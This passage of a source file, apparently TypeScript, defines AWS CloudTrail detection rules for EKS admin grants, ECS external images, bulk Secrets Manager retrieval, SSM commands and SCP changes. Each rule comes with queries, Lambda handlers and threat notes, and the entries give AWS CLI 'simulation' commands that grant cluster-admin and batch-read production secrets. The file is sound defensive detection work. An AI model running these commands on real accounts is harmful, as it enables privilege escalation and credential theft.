    return {
        "matched": True,
        "alert": {
            "rule_id": "det-026",
            "title": "EKS Broad Access Policy Associated",
            "severity": "Critical",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "cluster_name": request.get("clusterName"),
            "target_principal": request.get("principalArn"),
            "policy_arn": policy_arn,
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "eks.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.clusterName", "requestParameters.principalArn", "requestParameters.policyArn", "requestParameters.accessScope", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "eks.amazonaws.com", eventName: "AssociateAccessPolicy", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { clusterName: "my-cluster", principalArn: "arn:aws:iam::123456789012:role/app-role", policyArn: "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy", accessScope: { type: "cluster" } }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who granted the EKS access policy.", "Inspect the target principal receiving cluster access.", "Verify whether the policy and scope were approved.", "Review recent CreateAccessEntry or AccessKubernetesApi activity for the same principal."],
    testingSteps: ["Associate a broad access policy to an access entry in a lab cluster.", "Verify CloudTrail captures AssociateAccessPolicy.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "Associating a broad EKS access policy to an access entry directly grants Kubernetes permissions to an IAM principal. This is a much more concrete access-weakening signal than vague anonymous-auth wording.",
      threatContext: {
        attackerBehavior: "An attacker with eks:AssociateAccessPolicy can grant Kubernetes permissions to an IAM principal that already has an access entry. When the policy is broad, such as AmazonEKSClusterAdminPolicy, or when the scope is cluster, the change can create or expand administrative control over the entire cluster.",
        realWorldUsage: "This aligns with real cloud privilege-escalation behavior where attackers create durable administrative footholds after obtaining AWS credentials.",
        whyItMatters: "Unlike a generic configuration update, this event changes who can actually administer Kubernetes resources.",
        riskAndImpact: "If this goes undetected, an attacker can gain broad Kubernetes privileges, create backdoors, access secrets, deploy workloads, alter RBAC, and maintain long-term control of the cluster.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)"],
        requiredFields: ["eventSource", "eventName", "userIdentity.arn", "userIdentity.type", "requestParameters.clusterName", "requestParameters.principalArn", "requestParameters.policyArn", "requestParameters.accessScope.type", "requestParameters.accessScope.namespaces", "sourceIPAddress", "eventTime"],
        loggingRequirements: ["CloudTrail must capture EKS management events.", "Detection should match AssociateAccessPolicy events.", "Optional follow-on validation can use EKS audit logs or AccessKubernetesApi events to observe effective use."],
        limitations: ["This does not detect access granted only through Kubernetes RBAC objects without EKS access policies.", "Some cluster-wide associations can be legitimate for platform engineering roles and bootstrap workflows.", "Best fidelity comes from correlating this event with actor allowlists, target-principal context, or recent CreateAccessEntry activity."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "Should equal eks.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "Should equal AssociateAccessPolicy" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor granting the access policy" },
          { rawPath: "requestParameters.clusterName", normalizedPath: "aws.eks.cluster.name", notes: "Target cluster" },
          { rawPath: "requestParameters.principalArn", normalizedPath: "aws.eks.target_principal.arn", notes: "Principal receiving Kubernetes permissions" },
          { rawPath: "requestParameters.policyArn", normalizedPath: "aws.eks.access_policy.arn", notes: "Associated EKS access policy" },
          { rawPath: "requestParameters.accessScope.type", normalizedPath: "aws.eks.access_scope.type", notes: "Cluster or namespace scope" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["iam"], type: ["change"], action: "AssociateAccessPolicy", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { eks: { cluster: { name: "my-cluster" }, target_principal: { arn: "arn:aws:iam::123456789012:role/app-role" }, access_policy: { arn: "arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy" }, access_scope: { type: "cluster" } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Actor Context", description: "Determine whether the actor should ever manage EKS authorization.", examples: ["platform-admin role", "SSO team membership", "automation principal"], falsePositiveReduction: "Greatly reduces noise by separating approved cluster admins from unexpected actors." },
        { dimension: "Target Principal Context", description: "Profile the IAM principal receiving access.", examples: ["IAM user vs assumed role", "application workload role", "human vs service identity"], falsePositiveReduction: "Broad access granted to app roles or IAM users is usually more suspicious than grants to approved admin roles." },
        { dimension: "Policy and Scope Severity", description: "Rank the risk of the associated policy and its scope.", examples: ["AmazonEKSClusterAdminPolicy", "AmazonEKSAdminPolicy at cluster scope"], falsePositiveReduction: "Lets you prioritize truly dangerous grants and suppress narrower, expected namespace-scoped access." },
        { dimension: "Cluster Criticality", description: "Add the business importance and sensitivity of the affected cluster.", examples: ["prod cluster", "shared platform cluster", "security tooling cluster"], falsePositiveReduction: "Namespace-scoped access on a dev cluster is not equivalent to cluster-wide admin on production." },
      ],
      logicExplanation: {
        humanReadable: "This rule should detect documented EKS authorization changes, not an ambiguous anonymous-auth concept. The most defensible match is AssociateAccessPolicy when the policy is clearly broad, the scope is cluster, or both.",
        conditions: ["eventSource equals eks.amazonaws.com", "eventName equals AssociateAccessPolicy", "requestParameters.policyArn contains AmazonEKSClusterAdminPolicy or AmazonEKSAdminPolicy", "requestParameters.accessScope.type equals cluster"],
        tuningGuidance: "1. Allowlist known platform automation and approved EKS admin roles. 2. Escalate when the target principal is an IAM user, a workload role, or a newly created role. 3. Correlate with CreateAccessEntry within 15 minutes for higher-confidence privilege-escalation detection.",
        whenToFire: "Fire on broad EKS access policy associations, especially cluster-scoped admin-like policies.",
      },
      simulationCommand: "aws eks associate-access-policy --cluster-name prod-cluster --principal-arn arn:aws:iam::123456789012:role/app-role --policy-arn arn:aws:eks::aws:cluster-access-policy/AmazonEKSClusterAdminPolicy --access-scope type=cluster",
      quality: {
        signalQuality: 9,
        falsePositiveRate: "Low to Medium (legitimate platform administration exists, but the event is intrinsically security-sensitive)",
        expectedVolume: "Low in most environments; usually sparse outside cluster bootstrap or access-management workflows",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena", "CloudWatch Logs Insights", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda"],
        scheduling: "Real-time is ideal because this is a direct authorization grant. Batch queries every 5 to 15 minutes are still workable.",
        considerations: ["This overlaps conceptually with later EKS access-entry detections already in the repo.", "Consider correlating with CreateAccessEntry and AccessKubernetesApi for stronger context."],
      },
    },
  },
  // --- ECS ---
  {
    id: "det-027",
    title: "ECS Task Definition with External Image",
    description: "Detects registration of ECS task definitions using container images from non-approved registries.",
    awsService: "ECS",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["ECS", "Container", "Supply Chain"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Development environments pulling from public registries"],
    rules: {
      sigma: `title: ECS Task Definition External Image
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: ecs.amazonaws.com
    eventName: RegisterTaskDefinition
  suspicious_registry:
    requestParameters.containerDefinitions{}.image|contains:
      - 'docker.io/'
      - 'index.docker.io/'
      - 'ghcr.io/'
      - 'quay.io/'
  condition: selection and suspicious_registry
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=ecs.amazonaws.com eventName=RegisterTaskDefinition
| where like(requestParameters, "%docker.io/%") OR like(requestParameters, "%ghcr.io/%") OR like(requestParameters, "%quay.io/%")
| table _time, userIdentity.type, userIdentity.arn, requestParameters.family, requestParameters.taskRoleArn, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.family, requestParameters.taskRoleArn, requestParameters.containerDefinitions, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'ecs.amazonaws.com'
  AND eventName = 'RegisterTaskDefinition'
  AND (
    requestParameters.containerDefinitions LIKE '%docker.io/%'
    OR requestParameters.containerDefinitions LIKE '%ghcr.io/%'
    OR requestParameters.containerDefinitions LIKE '%quay.io/%'
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.family, requestParameters.taskRoleArn, requestParameters.containerDefinitions, sourceIPAddress
| filter eventSource = "ecs.amazonaws.com"
| filter eventName = "RegisterTaskDefinition"
| filter requestParameters.containerDefinitions like /docker\.io\/|ghcr\.io\/|quay\.io\//
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ecs"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["ecs.amazonaws.com"], eventName: ["RegisterTaskDefinition"] } }, null, 2),
      lambda: `"""
ECS Task Definition with External Image
Trigger: EventBridge rule matching RegisterTaskDefinition.
Use for: Real-time triage of unapproved registry usage in ECS task revisions.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "ecs.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "RegisterTaskDefinition":
        return {"matched": False}

    containers = detail.get("requestParameters", {}).get("containerDefinitions", [])
    images = [c.get("image", "") for c in containers if c.get("image")]
    suspicious = [img for img in images if any(host in img for host in ["docker.io/", "ghcr.io/", "quay.io/"])]
    if not suspicious:
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-027",
            "title": "ECS Task Definition with External Image",
            "severity": "High",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "task_family": detail.get("requestParameters", {}).get("family"),
            "images": suspicious,
            "task_role": detail.get("requestParameters", {}).get("taskRoleArn"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ecs.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.family", "requestParameters.containerDefinitions", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ecs.amazonaws.com", eventName: "RegisterTaskDefinition", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { family: "my-task", containerDefinitions: [{ image: "ghcr.io/example/app:latest" }] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who registered the task definition.", "Inspect the image source and whether the registry is approved.", "Review the task role for blast radius.", "Check whether the revision was later deployed with UpdateService or RunTask."],
    testingSteps: ["Register an ECS task definition with an image from a non-approved registry.", "Verify CloudTrail captures RegisterTaskDefinition.", "Run the detection to confirm it triggers."],
    lifecycle: {
      whyItMatters: "Registering a new ECS task definition can quietly introduce attacker-controlled code into an otherwise legitimate service. The production-grade signal is not merely non-ECR usage, but image sources that violate the organization's approved-registry and provenance model.",
      threatContext: {
        attackerBehavior: "An attacker with ecs:RegisterTaskDefinition can create a new task definition revision that points a container to an image they control, a typosquatted repository, or an unreviewed public image.",
        realWorldUsage: "Cloud and software supply-chain intrusions regularly abuse container images, package registries, and mutable tags as an execution path.",
        whyItMatters: "CloudTrail shows who registered the task definition and which image strings were supplied, giving defenders a high-value point to catch untrusted workload code before or near deployment.",
        riskAndImpact: "If this goes undetected, the attacker can deploy code that steals task-role credentials, accesses secrets, pivots to other AWS services, or establishes durable persistence in production workloads.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events for Amazon ECS)", "Approved registry policy inventory", "Optional image provenance metadata from CI/CD or ECR scanning"],
        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "sourceIPAddress", "requestParameters.family", "requestParameters.containerDefinitions[].image", "requestParameters.taskRoleArn", "requestParameters.executionRoleArn"],
        loggingRequirements: ["CloudTrail management events must be enabled for ECS.", "Maintain an approved-registry policy that understands allowed registry hosts, namespaces, and repositories.", "If you want high-fidelity supply-chain decisions, ingest image-signing, attestation, or scan metadata from your registry or CI/CD pipeline."],
        limitations: ["CloudTrail records the registration request, not whether the task definition was later deployed.", "The image field is just a string; CloudTrail does not validate whether the image was signed, scanned, or actually pulled successfully.", "A simple not-ECR filter is too weak because approved public registries and mirrors can be legitimate."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "Expected value ecs.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "Expected value RegisterTaskDefinition" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Caller that registered the new revision" },
          { rawPath: "requestParameters.family", normalizedPath: "aws.ecs.task_definition.family", notes: "Logical task-definition family" },
          { rawPath: "requestParameters.containerDefinitions[].image", normalizedPath: "container.image.name", notes: "Parse into registry, namespace, repository, tag, and digest" },
          { rawPath: "requestParameters.taskRoleArn", normalizedPath: "aws.ecs.task.role.arn", notes: "Role whose permissions the running task will inherit" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["creation"], action: "RegisterTaskDefinition", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { ecs: { task_definition: { family: "my-task" }, task: { role: { arn: "arn:aws:iam::123456789012:role/app-role" } } } },
          container: { image: { name: "ghcr.io/example/app:latest" } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Registry Approval Context", description: "Classify each image reference against an approved-registry policy keyed by workload and environment.", examples: ["private ECR only for prod", "ghcr.io/company-approved namespace allowed in dev"], falsePositiveReduction: "Prevents the detector from treating all non-ECR images as equally suspicious." },
        { dimension: "Image Provenance and Integrity", description: "Add signing status, digest pinning, image age, scan verdicts, and attestation presence.", examples: ["missing signature", "mutable latest tag", "no provenance attestation"], falsePositiveReduction: "Separates a known approved third-party image from an unreviewed or unsigned image reference." },
        { dimension: "Workload and Deployment Baseline", description: "Track which registries and repositories are normal for each task-definition family and ECS service.", examples: ["first time family payments-api used any registry outside private ECR", "registry newly introduced in production"], falsePositiveReduction: "Makes novelty meaningful by comparing the new image source to what the specific workload normally uses." },
        { dimension: "Identity and Role Sensitivity", description: "Enrich the caller and embedded task roles with ownership and effective privilege.", examples: ["approved CI role", "task role can access secretsmanager:GetSecretValue"], falsePositiveReduction: "Suppresses expected pipeline-driven revisions while escalating image-source changes that could expose high-value task roles." },
      ],
      logicExplanation: {
        humanReadable: "This detection should not page on every task definition that references an image outside private ECR. The production-grade pattern is to parse each container image into registry, namespace, repository, tag, and digest; compare that identity to an approved-registry policy for the workload; and then add supply-chain and workload-baseline context before deciding severity.",
        conditions: ["eventSource equals ecs.amazonaws.com", "eventName equals RegisterTaskDefinition", "requestParameters.containerDefinitions contains at least one image reference", "for at least one normalized container image, registry or namespace is not approved for the workload or environment"],
        tuningGuidance: "1. Maintain an explicit approved-registry inventory keyed by environment and workload. 2. Down-rank changes made by trusted CI/CD identities when the image also passes provenance checks. 3. Correlate RegisterTaskDefinition with UpdateService, CreateService, or RunTask.",
        whenToFire: "Fire when a task definition introduces an image source that is unapproved for that workload or violates the organization's image-trust policy, especially in production or when the embedded task role is sensitive.",
      },
      simulationCommand: `aws ecs register-task-definition --family payments-api --network-mode awsvpc --requires-compatibilities FARGATE --cpu 256 --memory 512 --execution-role-arn arn:aws:iam::123456789012:role/ecsTaskExecutionRole --task-role-arn arn:aws:iam::123456789012:role/payments-app-role --container-definitions '[{"name":"app","image":"ghcr.io/example-unapproved/nginx:latest","essential":true,"portMappings":[{"containerPort":8080,"protocol":"tcp"}]}]'`,
      quality: {
        signalQuality: 7,
        falsePositiveRate: "Medium-High with naive non-ECR logic; Low-Medium once approved-registry policy and provenance checks are in place",
        expectedVolume: "Low in tightly controlled production estates; moderate in mixed dev environments until registry policy is mature",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["EventBridge + Lambda", "Athena over CloudTrail logs", "Splunk", "Panther", "Chronicle", "Elastic", "Datadog"],
        scheduling: "Near-real-time is practical because RegisterTaskDefinition is a CloudTrail management event. Batch analytics every 5-15 minutes is also acceptable.",
        considerations: ["Do not ship this as a simple not-ECR rule if the goal is a production alert.", "Correlate with UpdateService, CreateService, or RunTask to understand whether the suspicious revision was actually activated."],
      },
    },
  },
  {
    id: "det-028",
    title: "Secrets Manager Bulk Secret Retrieval",
    description: "Detects retrieval of multiple secrets in a short timeframe, indicating potential credential harvesting.",
    awsService: "Secrets Manager",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["Secrets Manager", "Credential Access", "Exfiltration"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Application startup loading configuration secrets", "Secret rotation processes"],
    rules: {
      sigma: `title: Secrets Manager Bulk Retrieval
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: secretsmanager.amazonaws.com
    eventName: GetSecretValue
  condition: selection
  timeframe: 15m
  count: "> 5 distinct secrets"
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=secretsmanager.amazonaws.com eventName=GetSecretValue
| stats dc(requestParameters.secretId) as distinct_secrets count as retrievals values(requestParameters.secretId) as secrets by userIdentity.arn, bin(_time, 15m)
| where distinct_secrets > 5
| sort -distinct_secrets`,
      cloudtrail: `SELECT userIdentity.arn, date_trunc('minute', from_iso8601_timestamp(eventTime)) AS minute_bucket, approx_distinct(requestParameters.secretId) AS distinct_secrets, count(*) AS retrievals
FROM cloudtrail_logs
WHERE eventSource = 'secretsmanager.amazonaws.com'
  AND eventName = 'GetSecretValue'
GROUP BY 1, 2
HAVING approx_distinct(requestParameters.secretId) > 5
ORDER BY minute_bucket DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.secretId
| filter eventSource = "secretsmanager.amazonaws.com"
| filter eventName = "GetSecretValue"
| stats count_distinct(requestParameters.secretId) as distinct_secrets, count(*) as retrievals by userIdentity.arn, bin(15m)
| filter distinct_secrets > 5`,
      eventbridge: JSON.stringify({ source: ["aws.secretsmanager"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["secretsmanager.amazonaws.com"], eventName: ["GetSecretValue"] } }, null, 2),
      lambda: `"""
Secrets Manager Bulk Secret Retrieval
Trigger: EventBridge rule matching GetSecretValue.
Use for: Real-time aggregation of unusual breadth of secret access.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "secretsmanager.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "GetSecretValue":
        return {"matched": False}

    return {
        "matched": "requires-stateful-distinct-secret-counting",
        "alert": {
            "rule_id": "det-028",
            "title": "Secrets Manager Bulk Secret Retrieval",
            "severity": "High",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "secret_id": detail.get("requestParameters", {}).get("secretId"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "secretsmanager.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.secretId", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "secretsmanager.amazonaws.com", eventName: "GetSecretValue", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { secretId: "my-secret" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who retrieved secrets and how many distinct secrets were accessed.", "Verify if bulk retrieval matches app startup, rotation, or deployment behavior.", "Check for recent ListSecrets or discovery activity.", "Review secret classes and whether multiple applications or environments were touched."],
    testingSteps: ["Retrieve multiple distinct secrets in quick succession.", "Verify CloudTrail captures GetSecretValue.", "Run the detection to confirm distinct-secret-based alerting triggers."],
    lifecycle: {
      whyItMatters: "Bulk secret access is rarely well-modeled by a flat threshold because many legitimate workloads repeatedly fetch the same few secrets while compromised identities tend to broaden into many distinct secrets.",
      threatContext: {
        attackerBehavior: "After obtaining an AWS principal with secretsmanager:GetSecretValue, an attacker retrieves secrets in bulk to steal database credentials, API keys, tokens, and other high-value plaintext.",
        realWorldUsage: "Secrets retrieval is common post-compromise cloud tradecraft because Secrets Manager often concentrates privileged application credentials in one service.",
        whyItMatters: "The strongest suspicious pattern is usually breadth and novelty: a human user, newly active role, or compromised workload suddenly touching many different secrets outside its normal access pattern.",
        riskAndImpact: "If undetected, the attacker can exfiltrate a concentrated set of credentials that enables database access, lateral movement, and durable persistence.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail management events for AWS Secrets Manager", "Secret inventory and metadata from Secrets Manager APIs or AWS Config", "Optional IAM inventory for principal classification"],
        requiredFields: ["eventSource", "eventName", "eventTime", "userIdentity.type", "userIdentity.arn", "sourceIPAddress", "userAgent", "requestParameters.secretId", "requestParameters.secretIdList[]", "requestParameters.filters[]", "errorCode"],
        loggingRequirements: ["CloudTrail management events must be retained centrally for Secrets Manager.", "Normalize secret identifiers because CloudTrail requests may use friendly names, partial ARNs, or full ARNs for the same secret.", "Maintain at least 30 days of historical access data if you want actor-specific baselines to be meaningful."],
        limitations: ["CloudTrail shows that a secret was requested, but it does not log the plaintext secret value.", "A naive raw event count is unstable because repeated reads of the same secret can be legitimate.", "Legitimate startup, rotation, deployment, and break-glass workflows can touch many secrets quickly unless principals are classified separately."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "Expected value secretsmanager.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "Track GetSecretValue and BatchGetSecretValue-derived access" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Primary actor key for baseline modeling" },
          { rawPath: "userIdentity.type", normalizedPath: "user.type", notes: "Critical for separating humans from workload or automation roles" },
          { rawPath: "requestParameters.secretId", normalizedPath: "secrets.id_canonical", notes: "Normalize name, partial ARN, and full ARN to one canonical secret identity" },
          { rawPath: "sourceIPAddress", normalizedPath: "source.ip", notes: "Supports novelty and session-risk enrichment" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["access"], type: ["info"], action: "GetSecretValue", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          secrets: { id_canonical: "prod/payments/db-master" },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Behavioral Baseline", description: "Maintain baselines for each actor covering normal distinct secret count, normal secret families, and normal access windows.", examples: ["role usually reads 2-3 secrets tied to one application", "actor's 15-minute distinct-secret count is 6x its 30-day median"], falsePositiveReduction: "Converts noisy raw access volume into an anomaly anchored in how the principal normally behaves." },
        { dimension: "Secret Sensitivity and Ownership", description: "Classify each secret by business criticality, application ownership, environment, and secret type.", examples: ["prod/payments/db-master", "breakglass/admin/api-token", "sandbox/test-secret"], falsePositiveReduction: "Prevents routine access to low-risk app secrets from looking equivalent to sudden reads across production or admin credentials." },
        { dimension: "Identity and Execution Context", description: "Enrich the actor with principal class, owning team, runtime location, and whether the access path is expected.", examples: ["human IAM user using aws-cli from VPN", "Lambda execution role in prod", "break-glass role assumed outside maintenance window"], falsePositiveReduction: "Separates expected application secret reads from suspicious human or misused workload access paths." },
        { dimension: "Session and Access Novelty", description: "Add source IP, user agent, recent ListSecrets activity, and batch-retrieval usage so alerting can emphasize novel or exploratory access.", examples: ["ListSecrets followed by first-time access to many secrets", "CLI usage where role normally uses SDK from ECS"], falsePositiveReduction: "Raises confidence when many secrets are retrieved from an unexpected session, discovery pattern, or toolchain." },
      ],
      logicExplanation: {
        humanReadable: "This detection should not fire on a fixed raw count such as 10 GetSecretValue events in 5 minutes. The stronger production pattern is to canonicalize secret identifiers, count distinct secrets per actor within a bounded window, compare that breadth to the actor's historical baseline, and then require either a meaningful absolute floor or a supporting risk amplifier.",
        conditions: ["eventSource equals secretsmanager.amazonaws.com", "event action is GetSecretValue or a BatchGetSecretValue-derived secret access", "secret identifiers are normalized before aggregation", "within a 15-minute or 1-hour window, the actor accesses an unusually high number of distinct canonical secrets relative to its own baseline"],
        tuningGuidance: "1. Keep separate baselines for humans, workload roles, CI/CD roles, rotation Lambdas, and break-glass identities. 2. Canonicalize secret IDs before counting. 3. Prefer distinct-secret count and secret-family diversity over raw request count.",
        whenToFire: "Fire when a principal reads an unusually large or novel set of distinct secrets for its role and the access meaningfully exceeds its own normal breadth.",
      },
      simulationCommand: "aws secretsmanager batch-get-secret-value --secret-id-list prod/payments/db prod/payments/api prod/payments/jwt prod/payments/stripe prod/shared/slack-webhook",
      quality: {
        signalQuality: 8,
        falsePositiveRate: "High with a naive static threshold; Low-Medium once distinct-secret modeling, actor baselines, and automation classification are in place",
        expectedVolume: "Low in mature environments; moderate in secret-heavy platform accounts before principal baselines and ownership metadata are tuned",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena over CloudTrail logs", "CloudTrail Lake", "Splunk", "Panther", "Chronicle", "Elastic", "Datadog", "EventBridge + Lambda + state store"],
        scheduling: "Batch analytics every 5-15 minutes works well in Athena and SIEMs. Near-real-time alerting is practical only if the detector keeps state for distinct-secret windows and historical baselines.",
        considerations: ["Do not ship this as a pure static threshold rule if the goal is production-grade secret-theft detection.", "Canonical secret identity and BatchGetSecretValue deduplication are mandatory.", "Correlate with ListSecrets, DescribeSecret, recent credential changes, or unusual source sessions for higher-confidence findings."],
      },
    },
  },

  // --- SSM ---
  {
    id: "det-029",
    title: "SSM Run Command Execution",
    description: "Detects use of SSM SendCommand to execute commands on EC2 instances, a common lateral movement technique.",
    awsService: "SSM",
    relatedServices: ["EC2", "IAM"],
    severity: "High",
    tags: ["SSM", "Lateral Movement", "Command Execution"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Automated patching via SSM", "Legitimate ops commands"],
    rules: {
      sigma: `title: SSM Run Command Execution
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventName:
      - SendCommand
      - StartSession
  condition: selection
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail (eventName=SendCommand OR eventName=StartSession)
| table _time, userIdentity.arn, requestParameters.documentName, requestParameters.instanceIds{}`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.documentName
| filter eventName in ["SendCommand", "StartSession"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.ssm"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["SendCommand", "StartSession"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "ssm.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.documentName", "requestParameters.instanceIds", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "ssm.amazonaws.com", eventName: "SendCommand", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { documentName: "AWS-RunShellScript", instanceIds: ["i-xxx"] }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who ran the command and on which instances.", "Verify if this was automated patching or ops.", "Inspect the document name and parameters.", "Review for lateral movement indicators."],
    testingSteps: ["Run SSM SendCommand or StartSession on an instance.", "Verify CloudTrail captures the event.", "Run the detection to confirm the alert triggers."],},

  // --- Organizations ---
  {
    id: "det-030",
    title: "Organizations SCP Modified or Detached",
    description: "Detects changes to Service Control Policies which could remove security guardrails across the organization.",
    awsService: "Organizations",
    relatedServices: ["IAM"],
    severity: "Critical",
    tags: ["Organizations", "SCP", "Defense Evasion"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Planned governance changes by cloud platform team"],
    rules: {
      sigma: `title: Organizations SCP Change
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventName:
      - DetachPolicy
      - DeletePolicy
      - UpdatePolicy
  filter:
    eventSource: organizations.amazonaws.com
  condition: selection and filter
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=organizations.amazonaws.com
  (eventName=DetachPolicy OR eventName=DeletePolicy OR eventName=UpdatePolicy)
| table _time, userIdentity.arn, eventName, requestParameters.policyId`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.policyId
| filter eventSource = "organizations.amazonaws.com"
| filter eventName in ["DetachPolicy", "DeletePolicy", "UpdatePolicy"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.organizations"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventName: ["DetachPolicy", "DeletePolicy", "UpdatePolicy"] } }, null, 2),
    },
    relatedAttackSlugs: [],
